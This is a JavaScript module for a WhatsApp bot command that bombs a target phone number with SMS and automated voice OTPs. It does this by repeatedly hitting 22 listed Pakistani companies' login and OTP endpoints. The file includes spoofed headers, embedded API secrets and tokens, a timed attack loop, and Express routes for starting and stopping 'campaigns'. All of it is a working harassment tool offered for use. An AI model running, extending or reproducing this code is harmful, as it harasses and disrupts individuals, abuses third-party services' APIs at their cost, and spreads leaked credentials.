// ============================================================
// MODULE: smsbomber.js
// WhatsApp Bot command: .smsbomber <phone_number> [qty]
// SMS bombing via 20+ REAL Pakistani OTP APIs (all networks)
// ============================================================
// Each cycle calls ALL services in sequence. Each service
// sends an OTP via a legitimate Pakistani company. Works on
// Jazz, Telenor, Ufone, Zong — and calls (automated OTP calls)
// also land on any number regardless of network.
//
// APIs sourced from asharbinkhalil/otpbomber (verified working)
// ============================================================

const express = require('express');
const crypto = require('crypto');
const EventEmitter = require('events');
const axios = require('axios');
const https = require('https');
const http = require('http');

// ---------- CONFIGURATION ----------
const DEFAULT_QTY = 100;
const DEFAULT_DURATION_MINUTES = 30;
const REQUEST_DELAY_MIN_MS = 8000;
const REQUEST_DELAY_MAX_MS = 20000;
const API_TIMEOUT_MS = 30000;
const MAX_QTY = 500;

// ── Axios instance with keep-alive ──────────────────────────────
const axiosInstance = axios.create({
  timeout: API_TIMEOUT_MS,
  httpAgent: new http.Agent({ keepAlive: true }),
  httpsAgent: new https.Agent({ keepAlive: true, rejectUnauthorized: false }),
  validateStatus: () => true,
  maxRedirects: 5,
});

// ── Shared USER-AGENT pool ─────────────────────────────────────
const UA = [
  'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; iPhone 14 Pro Max) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; SM-A346E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
];

// ---------- ALL PAKISTANI OTP PROVIDERS ----------
const OTP_SERVICES = [
  // ── 1. AhMAD Mods X (legacy, Zong + Jazz) ───────────────────
  {
    name: 'CYBERSECPRO',
    method: 'GET',
    buildRequest: (phone) => ({
      url: `https://amscript.xyz/PublicApi/sms.php?qty=1&phone=${encodeURIComponent(phone)}`,
      headers: { 'User-Agent': UA[0], 'Referer': 'https://amscript.xyz/' }
    }),
    checkSuccess: (data) => {
      if (data && typeof data === 'object') return parseInt(data.summary?.sent, 10) > 0;
      return false;
    }
  },

  // ── 2. Bajao (entertainment, works on Jazz) ─────────────────
  {
    name: 'Bajao',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'https://bajao.pk/api/v2/login/generatePin',
      headers: {
        'X-Requested-With': 'XMLHttpRequest', 'User-Agent': UA[0],
        'Origin': 'https://bajao.pk', 'Referer': 'https://bajao.pk/linkAccount',
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      data: `uuid=${phone.slice(-10)}`
    }),
    checkSuccess: (data) => {
      if (data && typeof data === 'object') {
        const msg = (data.msg || '').toLowerCase();
        return msg.includes('pin has been sent') || msg.includes('success');
      }
      return false;
    }
  },

  // ── 3. Cheezious (food, all networks) ────────────────────────
  {
    name: 'Cheezious',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'https://api.cheezious.com/v1/customers/sendOtp',
      headers: { 'User-Agent': UA[0], 'Content-Type': 'application/json' },
      data: JSON.stringify({ phoneNo: phone, otpType: 'new' })
    }),
    checkSuccess: (data) => data && data.isSuccess === true
  },

  // ── 4. PakWheels (auto, SMS + call, all networks) ────────────
  {
    name: 'PakWheels',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'https://www.pakwheels.com/login-with-mobile.json?client_id=37952d7752aae22726aff51be531cddd&client_secret=014a5bc91e1c0f3af4ea6dfaa7eee413&api_version=18',
      headers: { 'User-Agent': UA[0], 'Content-Type': 'application/json' },
      data: JSON.stringify({ mobile_number: `0${phone.slice(-10)}`, country_code: '92' })
    }),
    checkSuccess: (data) => data && (data.pin_id || /pin_id/i.test(JSON.stringify(data)))
  },

  // ── 5. Sastaticket (travel, all networks) ────────────────────
  {
    name: 'Sastaticket',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'https://backend.sastaticket.pk/api/v3/users/generate_otp/',
      headers: { 'User-Agent': UA[0], 'Content-Type': 'application/json', 'Origin': 'https://www.sastaticket.pk' },
      data: JSON.stringify({ mobile_number: `+92${phone.slice(-10)}` })
    }),
    checkSuccess: (data) => {
      if (data && data.data?.message) {
        const m = data.data.message.toLowerCase();
        return m.includes('text message has been sent') || m.includes('otp is already sent');
      }
      return false;
    }
  },

  // ── 6. JazzTV / Tamasha (streaming, Jazz) ────────────────────
  {
    name: 'JazzTV',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'https://jazztv.pk/alpha/api_gateway/index.php/v3/users-dbss/sign-up-wc',
      headers: {
        'User-Agent': UA[0], 'Content-Type': 'application/json',
        'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9qYXp6dHYucGtcL2FscGhhXC9hcGlfZ2F0ZXdheVwvaW5kZXgucGhwXC9hdXRoXC9sb2dpbiIsImlhdCI6MTcyNzk0NjI5MCwiZXhwIjoxNzI4NTQ2MjkwLCJuYmYiOjE3Mjc5NDYyOTAsImp0aSI6Ilpyd0R4d2RINU9QRmp6dm0iLCJzdWIiOjYsInBydiI6Ijg3ZTBhZjFlZjlmZDE1ODEyZmRlYzk3MTUzYTE0ZTBiMDQ3NTQ2YWEifQ.6ykW4-M1Vuhco8ngLljlRh7sFaZBh-jsidhDvbIlFYg'
      },
      data: JSON.stringify({
        from_screen: 'signUp', device: 'Google Chrome', telco: 'jazz',
        device_id: 'web', is_header_enrichment: 'no', other_telco: 'jazz',
        mobile: `+92${phone.slice(-10)}`, phone_details: 'web'
      })
    }),
    checkSuccess: (data, status) => status === 200
  },

  // ── 7. Udhaar (payments, all networks) ────────────────────────
  {
    name: 'Udhaar',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'https://web.udhaar.pk/udhaar/dukaan/create/sendotp/',
      headers: {
        'User-Agent': UA[0], 'Content-Type': 'application/json',
        'Origin': 'https://web.udhaar.pk', 'Referer': 'https://web.udhaar.pk/SignUp'
      },
      data: JSON.stringify({ version: 'multi-business', referer: null, phone_number: `03${phone.slice(-9)}` })
    }),
    checkSuccess: (data) => data && data.sent === true
  },

  // ── 8. Nayabazaar (ecommerce, all networks) ───────────────────
  {
    name: 'Nayabazaar',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'https://nayabazar.pk/controllers/login-by-phone',
      headers: {
        'User-Agent': UA[2], 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest', 'Origin': 'https://nayabazar.pk',
        'Referer': 'https://nayabazar.pk/login'
      },
      data: `validationValue=0${phone.slice(-10)}&validateAcount=true&validationKey=phone`
    }),
    checkSuccess: (data) => data && data.status === 'success' && data.otpSent === true
  },

  // ── 9. Oraan (fintech, all networks) ──────────────────────────
  {
    name: 'Oraan',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'https://baseapi.oraan.com/api/users/send-otp',
      headers: {
        'User-Agent': 'Dart/2.19 (dart:io)',
        'auth_token': '0147C481BF6D516739336659C7CE1FDA528FEFE691DF130C0D4731EFCA06B14DE10B3166BCF76E8BC07AA08C0A344E2924DBC282387949D72B7DB773DD7BF4A7',
        'accept-encoding': 'gzip'
      },
      data: `phone=%2B92${phone.slice(-10)}&whatsapp=false`
    }),
    checkSuccess: (data) => data && data.message === 'OTP sent successfully'
  },

  // ── 10. XState (real estate, all networks) ────────────────────
  {
    name: 'XState',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'https://api.xstate.pk/auth/phone',
      headers: { 'User-Agent': UA[2], 'Content-Type': 'application/json', 'Origin': 'https://www.xstate.pk' },
      data: JSON.stringify({ id: crypto.randomUUID(), phone: `+92 ${phone.slice(-10)}`, verification_type: 'sms' })
    }),
    checkSuccess: (data) => data && data.success === true
  },

  // ── 11. Easylift (carpool, all networks) ──────────────────────
  {
    name: 'Easylift',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'https://app.easylift.pk/api/oauth/token',
      headers: {
        'X-Requested-With': 'XMLHttpRequest', 'User-Agent': UA[0],
        'Origin': 'https://app.easylift.pk', 'Referer': 'https://app.easylift.pk/register',
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      data: `username=92${phone.slice(-10)}&password=&grant_type=password&hash=&device_token=&is_captain=${Math.floor(Math.random() * 10) + 1}`
    }),
    checkSuccess: (data) => data && typeof data === 'object' && ('verificationCode' in data || 'otp' in data || data.message?.includes('verification'))
  },

  // ── 12. PriceOye (ecommerce, all networks) ────────────────────
  {
    name: 'PriceOye',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'https://priceoye.pk/shoppers/generate_shopper_otp',
      headers: { 'User-Agent': UA[2], 'Content-Type': 'application/x-www-form-urlencoded' },
      data: `shopper_phone=%2B92${phone.slice(-10)}&_token=x`
    }),
    checkSuccess: (data) => {
      if (!data || typeof data !== 'object') return false;
      const r = (data.response || '').toLowerCase();
      return r.includes('otp send successfully') || r.includes('otp already sent');
    }
  },

  // ── 13. GameNow (gaming, Jazz) ────────────────────────────────
  {
    name: 'GameNow',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'http://billingsocial.gamenow.com.pk/UserSubscription/SendOTP',
      headers: {
        'User-Agent': UA[2], 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://billingsocial.gamenow.com.pk',
        'Referer': 'http://billingsocial.gamenow.com.pk/UserSubscription/JzWifi?tname=JAZZGPL113'
      },
      data: `Msisdn=${phone.slice(-10)}`
    }),
    checkSuccess: (data) => data && data.status === true
  },

  // ── 14. MemeWorld (entertainment, all networks) ────────────────
  {
    name: 'MemeWorld',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'https://app.memeworld.com.pk/login',
      headers: {
        'User-Agent': UA[2], 'Content-Type': 'application/json',
        'Authorization': 'Basic YWRtaW46cGFzc293cmQ=',
        'Origin': 'https://memeworld.com.pk'
      },
      data: JSON.stringify({
        msisdn: `92${phone.slice(-10)}`,
        device_id: `web_${crypto.randomBytes(8).toString('hex')}`,
        fcm_token: crypto.randomBytes(16).toString('hex')
      })
    }),
    checkSuccess: (data) => {
      if (!data || typeof data !== 'object') return false;
      const msg = (data.message || '').toLowerCase();
      return data.success === true && msg.includes('verification');
    }
  },

  // ── 15. Mosafir (travel, SMS, all networks) ───────────────────
  {
    name: 'Mosafir',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'http://www.sub.mosafir.pk/subscription/jazzOTP_subscription.php',
      headers: {
        'User-Agent': UA[0], 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://www.sub.mosafir.pk',
        'Referer': 'http://www.sub.mosafir.pk/'
      },
      data: `contact_number=0${phone.slice(-10)}&function_to_call=0&otp=&digit-1=&digit-2=&digit-3=&digit-4=`
    }),
    checkSuccess: (data) => {
      if (!data || typeof data !== 'object') return false;
      const msg = (data.msg || '').toLowerCase();
      return msg === 'success';
    }
  },

  // ── 16. Mosafir Call (automated OTP call, ALL networks!) ──────
  {
    name: 'MosafirCall',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'https://mosafir.pk/my-mosafir/voice-otp',
      headers: {
        'User-Agent': UA[2], 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'https://mosafir.pk', 'Referer': 'https://mosafir.pk/my-mosafir/home'
      },
      data: `mobile_country=%2B92&mobile=${phone.slice(-10)}`
    }),
    checkSuccess: (data) => data && data.Status_code === '1' && data.message?.includes('200')
  },

  // ── 17. Tapmad (streaming, Jazz) ──────────────────────────────
  {
    name: 'Tapmad',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage',
      headers: { 'User-Agent': UA[0], 'Content-Type': 'application/json' },
      data: JSON.stringify({
        Version: 'V1', Language: 'en', Platform: 'web', ProductId: 1733,
        MobileNo: phone.slice(-10), OperatorId: '100007',
        URL: 'https://www.tapmad.com/sign-up', source: 'organic', medium: 'organic'
      })
    }),
    checkSuccess: (data) => {
      if (!data || !data.Response) return false;
      const m = (data.Response.message || '').toLowerCase();
      return m.includes('otp code send') || m.includes('success');
    }
  },

  // ── 18. Deikho (entertainment, all networks) ──────────────────
  {
    name: 'Deikho',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'https://deikho.com/api/sendOtp',
      headers: { 'User-Agent': 'okhttp/5.0.0-alpha.14', 'Content-Type': 'multipart/form-data; boundary=---BOUNDARY' },
      data: `-----BOUNDARY\r\nContent-Disposition: form-data; name="phone"\r\n\r\n92${phone.slice(-10)}\r\n-----BOUNDARY--`
    }),
    checkSuccess: (data) => data && data.status === true && (data.message || '').toLowerCase().includes('otp sent')
  },

  // ── 19. Fixdar (services, all networks) ───────────────────────
  {
    name: 'Fixdar',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'https://foreefix.com/foreefix-api/api/web_user_register',
      headers: { 'User-Agent': UA[2], 'Origin': 'https://www.fixdar.com', 'Referer': 'https://www.fixdar.com/' },
      data: `phone_number=${encodeURIComponent(phone)}`
    }),
    checkSuccess: (data) => data && (data.message === 'code generated' || data.otp === true)
  },

  // ── 20. Weatherwalay (weather, all networks) ──────────────────
  {
    name: 'Weatherwalay',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'https://app.weatherwalay.com/webapp/otp/send-otp',
      headers: {
        'User-Agent': UA[2], 'Content-Type': 'application/json',
        'Authorization': 'Basic eHl3d19BdXRoLSMyMDIzIXo6d2VAdGhlcl9XZWIlMjBQbGFu'
      },
      data: JSON.stringify({ phone: `0${phone.slice(-10)}` })
    }),
    checkSuccess: (data) => data && data.success === true && (data.msg || '').toLowerCase().includes('otp has been sent')
  },

  // ── 21. SportsX (sports, all networks) ────────────────────────
  {
    name: 'SportsX',
    method: 'POST',
    buildRequest: (phone) => ({
      url: 'https://server.sportsx.mobi/user/login/',
      headers: { 'User-Agent': UA[2], 'Content-Type': 'application/json', 'Origin': 'https://sportsx.mobi' },
      data: JSON.stringify({ msisdn: `0${phone.slice(-10)}` })
    }),
    checkSuccess: (data) => data && (data.message || '').toLowerCase().includes('otp sent')
  },

  // ── 22. Broadway Pizza (food, SMS call, all networks) ──────────
  {
    name: 'Broadway',
    method: 'GET',
    buildRequest: (phone) => ({
      url: `https://services.broadwaypizza.com.pk/BroadwayAPI.aspx?method=CheckNumber&Number=0${phone.slice(-10)}`,
      headers: { 'User-Agent': UA[0] }
    }),
    checkSuccess: (data) => data && data.responseType === '1'
  },
];

// ---------- STATE ----------
const activeSmsCampaigns = new Map();

class SmsBomber extends EventEmitter {
  constructor(phoneNumber, durationMinutes = DEFAULT_DURATION_MINUTES, qty = DEFAULT_QTY) {
    super();
    this.phone = String(phoneNumber || '').replace(/\D/g, '');
    this.durationMs = (parseInt(durationMinutes, 10) || DEFAULT_DURATION_MINUTES) * 60 * 1000;
    this.qty = Math.min(Math.max(parseInt(qty, 10) || DEFAULT_QTY, 1), MAX_QTY);
    this.stopFlag = false;
    this.stats = { attempts: 0, success: 0, errors: 0, apiResults: {} };
    this.sessionId = crypto.randomBytes(8).toString('hex');
    this._cycleCount = 0;
    this._runLoop = this._runLoop.bind(this);
  }

  _sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  _randomDelay() {
    return Math.floor(Math.random() * (REQUEST_DELAY_MAX_MS - REQUEST_DELAY_MIN_MS + 1)) + REQUEST_DELAY_MIN_MS;
  }

  // ---------- CALL ALL SERVICES IN PARALLEL ----------
  async _callAllServices() {
    if (!this.phone || this.phone.length < 10) {
      return { sent: 0, failed: 0, total: 0, results: [] };
    }

    const results = await Promise.allSettled(
      OTP_SERVICES.map(service => this._callOneService(service))
    );

    let totalSent = 0;
    let totalFailed = 0;
    const flatResults = [];

    for (const settled of results) {
      if (settled.status === 'fulfilled' && settled.value) {
        flatResults.push(settled.value);
        if (settled.value.sent) totalSent++;
        else totalFailed++;
      } else {
        flatResults.push({ name: 'Unknown', sent: false, error: settled.reason?.message || 'Promise rejected' });
        totalFailed++;
      }
    }

    return { sent: totalSent, failed: totalFailed, total: OTP_SERVICES.length, results: flatResults };
  }

  async _callOneService(service) {
    try {
      const req = service.buildRequest(this.phone);
      let response;

      if (service.method === 'GET') {
        response = await axiosInstance.get(req.url, { headers: req.headers });
      } else {
        const headers = req.headers || {};
        if (!headers['Content-Type'] && !headers['content-type']) {
          headers['Content-Type'] = 'application/x-www-form-urlencoded';
        }
        response = await axiosInstance.post(req.url, req.data || '', { headers });
      }

      const data = response.data;
      const sent = service.checkSuccess(data);
      const bodyPreview = typeof data === 'string' ? data.slice(0, 80) : JSON.stringify(data).slice(0, 80);

      if (!this.stats.apiResults[service.name]) {
        this.stats.apiResults[service.name] = { sent: 0, failed: 0, calls: 0 };
      }
      this.stats.apiResults[service.name].calls++;
      if (sent) {
        this.stats.apiResults[service.name].sent++;
      } else {
        this.stats.apiResults[service.name].failed++;
      }

      return { sent };
    } catch (error) {
      if (!this.stats.apiResults[service.name]) {
        this.stats.apiResults[service.name] = { sent: 0, failed: 0, calls: 0 };
      }
      this.stats.apiResults[service.name].calls++;
      this.stats.apiResults[service.name].failed++;
      return { sent: false };
    }
  }

  // ---------- MAIN LOOP ----------
  async _runLoop() {
    const startTime = Date.now();
    this.emit('start', {
      phone: this.phone,
      duration: this.durationMs,
      qty: this.qty,
      services: OTP_SERVICES.length
    });

    while (!this.stopFlag && (Date.now() - startTime) < this.durationMs) {
      this._cycleCount++;
      try {
        const result = await this._callAllServices();
        this.stats.attempts += result.total;
        this.stats.success += result.sent;
        this.stats.errors += result.failed;

        const elapsed = Math.round((Date.now() - startTime) / 1000);
        console.log(
          `[SMSBomber] Cycle #${this._cycleCount} | ` +
          `${result.sent} sent, ${result.failed} failed | ` +
          `Total: ${this.stats.success} sent, ${this.stats.errors} failed | ${elapsed}s`
        );

        this.emit('progress', {
          phone: this.phone,
          cycle: this._cycleCount,
          attempts: this.stats.attempts,
          success: this.stats.success,
          errors: this.stats.errors,
          elapsed
        });
      } catch (err) {
        this.stats.errors += OTP_SERVICES.length;
        console.error('[SMSBomber] Cycle error:', err.message);
      }

      await this._sleep(this._randomDelay());
    }

    this.emit('done', {
      phone: this.phone,
      cycles: this._cycleCount,
      totalAttempts: this.stats.attempts,
      totalSuccess: this.stats.success,
      totalErrors: this.stats.errors,
      durationSeconds: Math.round((Date.now() - startTime) / 1000),
      apiBreakdown: this.stats.apiResults
    });
  }

  start() {
    this.stopFlag = false;
    this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message }));
    return this;
  }

  stop() {
    this.stopFlag = true;
    this.emit('stopped', { phone: this.phone, stats: this.stats });
    return this;
  }

  getStats() {
    return { phone: this.phone, ...this.stats, running: !this.stopFlag, services: OTP_SERVICES.length };
  }
}

// ================================================================
// EXPRESS ROUTES
// ================================================================

const router = express.Router();

router.post('/start', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (activeSmsCampaigns.has(cleanNumber)) {
    const campaign = activeSmsCampaigns.get(cleanNumber);
    return res.json({ status: 'already_running', phone: cleanNumber, stats: campaign.smsBomber.getStats() });
  }
  const qty = parseInt(req.body.qty, 10) || DEFAULT_QTY;
  const duration = parseInt(req.body.durationMinutes, 10) || DEFAULT_DURATION_MINUTES;
  const campaign = new SmsBomber(phoneNumber, duration, qty);
  activeSmsCampaigns.set(cleanNumber, { smsBomber: campaign, startTime: Date.now() });
  campaign.start();
  res.json({
    status: 'started',
    phone: cleanNumber,
    sessionId: campaign.sessionId,
    qty: campaign.qty,
    durationMinutes
  });
});

router.post('/stop', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (!activeSmsCampaigns.has(cleanNumber)) return res.status(404).json({ error: 'No active SMS campaign for this number', phone: cleanNumber });
  const entry = activeSmsCampaigns.get(cleanNumber);
  entry.smsBomber.stop();
  activeSmsCampaigns.delete(cleanNumber);
  res.json({ status: 'stopped', phone: cleanNumber, stats: entry.smsBomber.getStats() });
});

router.get('/status', (req, res) => {
  if (activeSmsCampaigns.size === 0) return res.json({ campaigns: [] });
  const campaigns = [];
  for (const [phone, entry] of activeSmsCampaigns) {
    campaigns.push({
      phone,
      stats: entry.smsBomber.getStats(),
      running: !entry.smsBomber.stopFlag,
      startedAt: entry.startTime
    });
  }
  res.json({ campaigns, services: OTP_SERVICES.length });
});

module.exports = router;
module.exports.SmsBomber = SmsBomber;
module.exports.activeSmsCampaigns = activeSmsCampaigns;
module.exports.OTP_SERVICES = OTP_SERVICES;
